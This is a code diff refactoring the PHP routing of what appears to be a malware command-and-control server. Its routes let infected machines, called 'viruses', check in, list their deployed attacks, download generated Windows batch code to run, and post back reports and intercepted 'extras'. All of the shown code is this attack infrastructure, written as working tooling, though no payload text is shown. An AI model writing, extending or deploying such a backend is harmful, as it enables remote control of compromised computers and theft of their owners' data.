@@ -4,24 +4,23 @@ use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\BaseScriptWin;
 use Kelvinho\Virus\Singleton\Header;
 use Kelvinho\Virus\Singleton\Logs;
-use Kelvinho\Virus\Virus\Virus;
 
 // routes for viruses
-$router->getMulti(["vrs/*/aks", "viruses/*/attacks"], function () use ($requestData) {
+$router->getMulti(["vrs/*/aks", "viruses/*/attacks"], function () use ($requestData, $virusFactory) {
     $virus_id = $requestData->getExplodedPath()[1];
-    if (!Virus::exists($virus_id)) Logs::strayVirus($virus_id);
-    echo join("\n", Virus::getAttacks($virus_id, AttackBase::STATUS_DEPLOYED));
+    if (!$virusFactory->exists($virus_id)) Logs::strayVirus($virus_id);
+    echo join("\n", $virusFactory->get($virus_id)->getAttacks(AttackBase::STATUS_DEPLOYED));
     Header::ok();
 });
 $router->getMulti(["vrs/*/ping", "viruses/*/ping"], function () use ($requestData, $virusFactory) {
     $virus_id = $requestData->getExplodedPath()[1];
-    if (!Virus::exists($virus_id)) Logs::strayVirus($virus_id);
+    if (!$virusFactory->exists($virus_id)) Logs::strayVirus($virus_id);
     $virusFactory->get($virus_id)->ping();
     Header::ok();
 });
 $router->getMulti(["vrs/*/aks/*/code", "viruses/*/attacks/*/code"], function () use ($requestData, $attackFactory) {
     $attack_id = $requestData->getExplodedPath()[3];
-    if (!AttackBase::exists($attack_id)) Logs::strayAttack($attack_id);
+    if (!$attackFactory->exists($attack_id)) Logs::strayAttack($attack_id);
     $attack = $attackFactory->get($attack_id);
     echo ($attack->getStatus() == AttackBase::STATUS_EXECUTED ? "" : $attack->generateBatchCode());
     Header::ok();
@@ -29,13 +28,13 @@ $router->getMulti(["vrs/*/aks/*/code", "viruses/*/attacks/*/code"], function () 
 $router->postMulti(["vrs/*/aks/*/report", "viruses/*/attacks/*/report"], function () use ($requestData, $virusFactory, $attackFactory) {
     echo "something";
     $attack_id = $requestData->getExplodedPath()[3];
-    if (!AttackBase::exists($attack_id)) Logs::strayAttack($attack_id);
+    if (!$attackFactory->exists($attack_id)) Logs::strayAttack($attack_id);
     $attackFactory->get($attack_id)->includeIntercept();
     Header::ok();
 });
 $router->getMulti(["vrs/*/aks/*/extras/*", "viruses/*/attacks/*/extras/*"], function () use ($requestData, $attackFactory) {
     $attack_id = $requestData->getExplodedPath()[3];
-    if (!AttackBase::exists($attack_id)) Logs::strayAttack($attack_id);
+    if (!$attackFactory->exists($attack_id)) Logs::strayAttack($attack_id);
     $attack = $attackFactory->get($attack_id);
     $attack->processExtras($requestData->getExplodedPath()[5]);
     Header::ok();
